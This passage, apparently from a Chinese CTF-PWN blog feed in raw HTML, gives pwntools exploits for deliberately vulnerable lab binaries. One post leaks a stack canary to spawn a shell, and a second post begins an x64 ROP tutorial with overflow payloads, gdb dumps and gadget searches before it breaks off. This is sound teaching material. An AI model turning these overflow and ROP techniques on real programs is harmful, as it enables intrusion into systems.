punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span> sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0xa</span><span class="token keyword">print</span> <span class="token string">"canary =>"</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>canary<span class="token punctuation">)</span></code></pre><p>结果：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x6c bytes:    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│    *    00000060  41 41 41 41  0a f7 a3 0b  88 87 04 08               │AAAA│····│····│    0000006ccanary <span class="token operator">=</span><span class="token operator">></span>0xba3f700</code></pre><p>那接下来我们测出溢出点就可以了，我们可以插入gdb.attach(sh)在调试中测试：</p><p>测试</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span>getshell <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'getshell'</span><span class="token punctuation">]</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./test'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span> sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0xa</span><span class="token keyword">print</span> <span class="token string">"canary =>"</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>canary<span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>getshell<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#p32(canary)绕过后我用100个A来查找</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>----------------------------------registers-----------------------------------<span class="token punctuation">]</span>EAX: 0x0 EBX: 0x41414141 <span class="token punctuation">(</span><span class="token string">'AAAA'</span><span class="token punctuation">)</span>ECX: 0x64 <span class="token punctuation">(</span><span class="token string">'d'</span><span class="token punctuation">)</span>EDX: 0xf7f5a890 --<span class="token operator">></span> 0x0 ESI: 0xf7f59000 --<span class="token operator">></span> 0x1d4d6c EDI: 0x0 EBP: 0x41414141 <span class="token punctuation">(</span><span class="token string">'AAAA'</span><span class="token punctuation">)</span>ESP: 0xffb278dc <span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">&lt;</span>repeats 88 times<span class="token operator">></span>, <span class="token string">"\246\205\004\b\nA5\f"</span><span class="token punctuation">)</span>EIP: 0x8048696 <span class="token punctuation">(</span><span class="token operator">&lt;</span>vuln+107<span class="token operator">></span>:    ret<span class="token punctuation">)</span>EFLAGS: 0x246 <span class="token punctuation">(</span>carry PARITY adjust ZERO sign <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>   0x804868d <span class="token operator">&lt;</span>vuln+98<span class="token operator">></span>:    call   0x8048750 <span class="token operator">&lt;</span>__stack_chk_fail_local<span class="token operator">></span>   0x8048692 <span class="token operator">&lt;</span>vuln+103<span class="token operator">></span>:    mov    ebx,DWORD PTR <span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span>   0x8048695 <span class="token operator">&lt;</span>vuln+106<span class="token operator">></span>:    leave  <span class="token operator">=</span><span class="token operator">></span> 0x8048696 <span class="token operator">&lt;</span>vuln+107<span class="token operator">></span>:    ret       0x8048697 <span class="token operator">&lt;</span>main<span class="token operator">></span>:    lea    ecx,<span class="token punctuation">[</span>esp+0x4<span class="token punctuation">]</span>   0x804869b <span class="token operator">&lt;</span>main+4<span class="token operator">></span>:    and    esp,0xfffffff0   0x804869e <span class="token operator">&lt;</span>main+7<span class="token operator">></span>:    push   DWORD PTR <span class="token punctuation">[</span>ecx-0x4<span class="token punctuation">]</span>   0x80486a1 <span class="token operator">&lt;</span>main+10<span class="token operator">></span>:    push   ebp<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0xffb278dc <span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">&lt;</span>repeats 88 times<span class="token operator">></span>, <span class="token string">"\246\205\004\b\nA5\f"</span><span class="token punctuation">)</span>0004<span class="token operator">|</span> 0xffb278e0 <span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">&lt;</span>repeats 84 times<span class="token operator">></span>, <span class="token string">"\246\205\004\b\nA5\f"</span><span class="token punctuation">)</span>0008<span class="token operator">|</span> 0xffb278e4 <span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">&lt;</span>repeats 80 times<span class="token operator">></span>, <span class="token string">"\246\205\004\b\nA5\f"</span><span class="token punctuation">)</span>0012<span class="token operator">|</span> 0xffb278e8 <span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">&lt;</span>repeats 76 times<span class="token operator">></span>, <span class="token string">"\246\205\004\b\nA5\f"</span><span class="token punctuation">)</span>0016<span class="token operator">|</span> 0xffb278ec <span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">&lt;</span>repeats 72 times<span class="token operator">></span>, <span class="token string">"\246\205\004\b\nA5\f"</span><span class="token punctuation">)</span>0020<span class="token operator">|</span> 0xffb278f0 <span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">&lt;</span>repeats 68 times<span class="token operator">></span>, <span class="token string">"\246\205\004\b\nA5\f"</span><span class="token punctuation">)</span>0024<span class="token operator">|</span> 0xffb278f4 <span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">&lt;</span>repeats 64 times<span class="token operator">></span>, <span class="token string">"\246\205\004\b\nA5\f"</span><span class="token punctuation">)</span>0028<span class="token operator">|</span> 0xffb278f8 <span class="token punctuation">(</span><span class="token string">'A'</span> <span class="token operator">&lt;</span>repeats 60 times<span class="token operator">></span>, <span class="token string">"\246\205\004\b\nA5\f"</span><span class="token punctuation">)</span><span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, value0x08048696 <span class="token keyword">in</span> vuln <span class="token punctuation">(</span><span class="token punctuation">)</span>gdb-peda$ </code></pre><p>可以看到确实绕过了canary而且在ESP提示：后面又88个A，所以多了88个。因此只要12个即可。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span>getshell <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'getshell'</span><span class="token punctuation">]</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./test'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span> sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0xa</span>   <span class="token comment" spellcheck="true">##不要忘了cookie是随机的</span><span class="token keyword">print</span> <span class="token string">"canary =>"</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>canary<span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">12</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>getshell<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre><code>[*] Switching to interactive mode[DEBUG] Received 0x64 bytes:    &#39;A&#39; * 0x64AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$ whoami[DEBUG] Sent 0x7 bytes:    &#39;whoami\n&#39;[DEBUG] Received 0x7 bytes:    &#39;hunter\n&#39;hunter$  </code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蒸米X64</title>
      <link href="/2020/07/10/zheng-mi-x64/"/>
      <url>/2020/07/10/zheng-mi-x64/</url>
      
        <content type="html"><![CDATA[<h2 id="1：X86-X64主要区别"><a href="#1：X86-X64主要区别" class="headerlink" title="1：X86 X64主要区别"></a>1：X86 X64主要区别</h2><ul><li>首先是内存地址的范围由32位变成了64位。但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常</li><li>其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上</li></ul><p><strong>常见寄存器</strong></p><pre class=" language-bash"><code class="language-bash">64-bit             register Lower 32             bits Lower 16             bits Lower 8 bitsrax             eax                         ax                         alrbx             ebx                         bx                         blrcx             ecx                         cx                         clrdx             edx                         dx                         dlrsi             esi                         si                         silrdi             edi                         di                         dilrbp             ebp                         bp                         bplrsp             esp                         sp                         splr8                 r8d                         r8w                     r8br9                 r9d                         r9w                     r9br10             r10d                         r10w                     r10br11             r11d                         r11w                     r11br12             r12d                         r12w                     r12br13             r13d                         r13w                     r13br14             r14d                         r14w                     r14br15             r15d                         r15w                     r15b</code></pre><h2 id="2：例子–level3"><a href="#2：例子–level3" class="headerlink" title="2：例子–level3"></a>2：例子–level3</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">void</span> <span class="token function">callsystem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> <span class="token string">"Hello, World\n"</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>关闭 stack ，pie </p><pre class=" language-bash"><code class="language-bash">gcc -fno-stack-protector -no-pie level3.c -o level3</code></pre><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>显然可以由vulnerable函数溢出控制跳转到callsystem函数就能执行system了</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./level3'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#callsystem：0x0000000000400577</span><span class="token comment" spellcheck="true">#0x000000000040044e : ret</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">136</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x000000000040044e</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0000000000400577</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>知道我为啥要在跳转callsystem时加一个ret吗，因为不这样做我在本地执行会出现堆栈不能对齐的错误。</p><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/rop/蒸米rop/x64$ python level3.py <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting local process <span class="token string">'./level3'</span><span class="token keyword">:</span> pid 7213<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive modeHELLO,WORLD\x00$  </code></pre><p><strong>可以发现X64的栈溢出控制程序转跳和X86没啥区别，就是多注意堆栈不平衡</strong></p><h3 id="探究"><a href="#探究" class="headerlink" title="探究"></a>探究</h3><p>前面提到，x64的可用地址不能大于0x00007fffffffffff，我们用这个程序试一下’</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./level3'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0x000000000040044e : ret</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">136</span> <span class="token operator">+</span> <span class="token string">'AAAAAAAA'</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>在gdb直接c一直执行，结果：</p><pre class=" language-bash"><code class="language-bash">RSP: 0x7fffffffde98 <span class="token punctuation">(</span><span class="token string">"AAAAAAAA\n\337\377\377\377\177"</span><span class="token punctuation">)</span>RIP: 0x4005aa <span class="token punctuation">(</span><span class="token operator">&lt;</span>vulnerable_function+32<span class="token operator">></span>:    ret<span class="token punctuation">)</span>R8 <span class="token keyword">:</span> 0x7ffff7dd0d80 --<span class="token operator">></span> 0x0 R9 <span class="token keyword">:</span> 0x7ffff7dd0d80 --<span class="token operator">></span> 0x0 R10: 0x3 R11: 0x246 R12: 0x400490 <span class="token punctuation">(</span><span class="token operator">&lt;</span>_start<span class="token operator">></span>:    xor    ebp,ebp<span class="token punctuation">)</span>R13: 0x7fffffffdf90 --<span class="token operator">></span> 0x1 R14: 0x0 R15: 0x0EFLAGS: 0x10203 <span class="token punctuation">(</span>CARRY parity adjust zero sign <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>   0x4005a3 <span class="token operator">&lt;</span>vulnerable_function+25<span class="token operator">></span>:    call   0x400480 <span class="token operator">&lt;</span>read@plt<span class="token operator">></span>   0x4005a8 <span class="token operator">&lt;</span>vulnerable_function+30<span class="token operator">></span>:    nop   0x4005a9 <span class="token operator">&lt;</span>vulnerable_function+31<span class="token operator">></span>:    leave  <span class="token operator">=</span><span class="token operator">></span> 0x4005aa <span class="token operator">&lt;</span>vulnerable_function+32<span class="token operator">></span>:    ret       0x4005ab <span class="token operator">&lt;</span>main<span class="token operator">></span>:    push   rbp   0x4005ac <span class="token operator">&lt;</span>main+1<span class="token operator">></span>:    mov    rbp,rsp   0x4005af <span class="token operator">&lt;</span>main+4<span class="token operator">></span>:    sub    rsp,0x10   0x4005b3 <span class="token operator">&lt;</span>main+8<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>rbp-0x4<span class="token punctuation">]</span>,edi<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0x7fffffffde98 <span class="token punctuation">(</span><span class="token string">"AAAAAAAA\n\337\377\377\377\177"</span><span class="token punctuation">)</span>0008<span class="token operator">|</span> 0x7fffffffdea0 --<span class="token operator">></span> 0x7fffffffdf0a --<span class="token operator">></span> 0x8541000000000000 0016<span class="token operator">|</span> 0x7fffffffdea8 --<span class="token operator">></span> 0x100000000 0024<span class="token operator">|</span> 0x7fffffffdeb0 --<span class="token operator">></span> 0x4005f0 <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">></span>:    push   r15<span class="token punctuation">)</span>0032<span class="token operator">|</span> 0x7fffffffdeb8 --<span class="token operator">></span> 0x7ffff7a05b97 <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_start_main+231<span class="token operator">></span>:    mov    edi,eax<span class="token punctuation">)</span>0040<span class="token operator">|</span> 0x7fffffffdec0 --<span class="token operator">></span> 0x1 0048<span class="token operator">|</span> 0x7fffffffdec8 --<span class="token operator">></span> 0x7fffffffdf98 --<span class="token operator">></span> 0x7fffffffe2f7 <span class="token punctuation">(</span><span class="token string">"./level3"</span><span class="token punctuation">)</span>0056<span class="token operator">|</span> 0x7fffffffded0 --<span class="token operator">></span> 0x100008000 <span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, valueStopped reason: SIGSEGV0x00000000004005aa <span class="token keyword">in</span> vulnerable_function <span class="token punctuation">(</span><span class="token punctuation">)</span>gdb-peda$ </code></pre><p>停在了vulnerable函数的ret，因为此时可以看到rsp里面是我们的AAAAAAAA即0x4141414141414141大于0x00007fffffffffff所以不会跳转，而是停在ret。那么我们把地址调小</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./level3'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0x000000000040044e : ret</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">136</span> <span class="token operator">+</span> <span class="token string">'ABCDEF\x00\x00'</span>  <span class="token comment" spellcheck="true">#小端序\x00\x00会存在高地址</span><span class="token comment" spellcheck="true">#payload = 'a'*136 + 'AAAAAAAA'</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：</p><pre class=" language-bash"><code class="language-bash">RSP: 0x7fffffffdea0 --<span class="token operator">></span> 0x7fffffffdf0a --<span class="token operator">></span> 0x1c80000000000000 RIP: 0x464544434241 <span class="token punctuation">(</span><span class="token string">'ABCDEF'</span><span class="token punctuation">)</span>R8 <span class="token keyword">:</span> 0x7ffff7dd0d80 --<span class="token operator">></span> 0x0 R9 <span class="token keyword">:</span> 0x7ffff7dd0d80 --<span class="token operator">></span> 0x0 R10: 0x3 R11: 0x246 R12: 0x400490 <span class="token punctuation">(</span><span class="token operator">&lt;</span>_start<span class="token operator">></span>:    xor    ebp,ebp<span class="token punctuation">)</span>R13: 0x7fffffffdf90 --<span class="token operator">></span> 0x1 R14: 0x0 R15: 0x0EFLAGS: 0x10203 <span class="token punctuation">(</span>CARRY parity adjust zero sign <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>Invalid <span class="token variable">$PC</span> address: 0x464544434241<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0x7fffffffdea0 --<span class="token operator">></span> 0x7fffffffdf0a --<span class="token operator">></span> 0x1c80000000000000 0008<span class="token operator">|</span> 0x7fffffffdea8 --<span class="token operator">></span> 0x100000000 0016<span class="token operator">|</span> 0x7fffffffdeb0 --<span class="token operator">></span> 0x4005f0 <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">></span>:    push   r15<span class="token punctuation">)</span>0024<span class="token operator">|</span> 0x7fffffffdeb8 --<span class="token operator">></span> 0x7ffff7a05b97 <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_start_main+231<span class="token operator">></span>:    mov    edi,eax<span class="token punctuation">)</span>0032<span class="token operator">|</span> 0x7fffffffdec0 --<span class="token operator">></span> 0x1 0040<span class="token operator">|</span> 0x7fffffffdec8 --<span class="token operator">></span> 0x7fffffffdf98 --<span class="token operator">></span> 0x7fffffffe2f7 <span class="token punctuation">(</span><span class="token string">"./level3"</span><span class="token punctuation">)</span>0048<span class="token operator">|</span> 0x7fffffffded0 --<span class="token operator">></span> 0x100008000 0056<span class="token operator">|</span> 0x7fffffffded8 --<span class="token operator">></span> 0x4005ab <span class="token punctuation">(</span><span class="token operator">&lt;</span>main<span class="token operator">></span>:    push   rbp<span class="token punctuation">)</span><span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, valueStopped reason: SIGSEGV0x0000464544434241 <span class="token keyword">in</span> ?? <span class="token punctuation">(</span><span class="token punctuation">)</span>gdb-peda$ </code></pre><p>成功跳转到0x0000464544434241即 \x00\x00ABCDEF<br><strong>所以我们在ret地址的时候要注意这个问题可用地址不能大于0x00007fffffffffff</strong></p><h2 id="3：level4"><a href="#3：level4" class="headerlink" title="3：level4"></a>3：level4</h2><p>在leve3的基础上把后门callsystem换成一个输出system地址的函数</p><h3 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;dlfcn.h></span></span><span class="token keyword">void</span> <span class="token function">systemaddr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">void</span><span class="token operator">*</span> handle <span class="token operator">=</span> <span class="token function">dlopen</span><span class="token punctuation">(</span><span class="token string">"libc.so.6"</span><span class="token punctuation">,</span> RTLD_LAZY<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span><span class="token function">dlsym</span><span class="token punctuation">(</span>handle<span class="token punctuation">,</span><span class="token string">"system"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">systemaddr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"Hello, World\n"</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>同样关闭stack  pie  还有因为用到了dlopen，dlsym函数要加上-ldl</p><pre class=" language-bash"><code class="language-bash">gcc -fno-stack-protector -no-pie level4.c -o level4 -ldl</code></pre><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>这个程序会输出system地址那么在本地找到libc.so.6就可以计算出/bin/sh地址，再由vulnerable处的栈溢出控制程序执行system函数即可，但问题是X64函数的前6个参数依次放在对应寄存器中，对于system函数它只有一个参数（/bin/sh）那么就应该放在rdi里面。我们可以控制的只有栈中的数据，想让栈中的/bin/sh地址放到rdi中就得需要pop rdi 指令。<br>所以用ROPgadgates寻找这个指令。</p><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/rop/蒸米rop/x64$ ROPgadget --binary level4 --only <span class="token string">'pop|ret'</span>Gadgets information<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>0x00000000004006d2 <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> ret0x00000000004006d1 <span class="token keyword">:</span> pop rbx <span class="token punctuation">;</span> pop rbp <span class="token punctuation">;</span> ret0x0000000000400585 <span class="token keyword">:</span> ret0x0000000000400735 <span class="token keyword">:</span> ret 0xbdb8Unique gadgets found: 4</code></pre><p><strong>对level4文件搜寻没有看到，那么就对libc文件搜寻（本地提前准备好libc文件）</strong></p><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/rop/蒸米rop/x64$ ROPgadget --binary libc.so.6 --only <span class="token string">'pop|ret'</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'rdi'</span>0x00000000000221a3 <span class="token keyword">:</span> pop rdi <span class="token punctuation">;</span> pop rbp <span class="token punctuation">;</span> ret0x000000000002155f <span class="token keyword">:</span> pop rdi <span class="token punctuation">;</span> ret0x000000000005b4fd <span class="token keyword">:</span> pop rdi <span class="token punctuation">;</span> ret 0x38</code></pre><p>找到一个：0x000000000002155f : pop rdi ; ret 